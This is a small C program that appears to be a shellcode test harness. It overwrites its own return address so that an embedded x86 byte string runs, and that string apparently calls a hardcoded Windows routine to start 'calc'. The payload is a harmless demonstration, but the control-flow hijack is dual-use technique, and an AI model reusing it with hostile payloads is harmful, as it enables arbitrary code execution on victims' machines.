#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = "\xeB\x02\xBA\xC7\x93"
                            "\xBF\x77\xFF\xD2\xCC"
                            "\xE8\xF3\xFF\xFF\xFF"
                            "\x63\x61\x6C\x63";
int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %ld\n",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}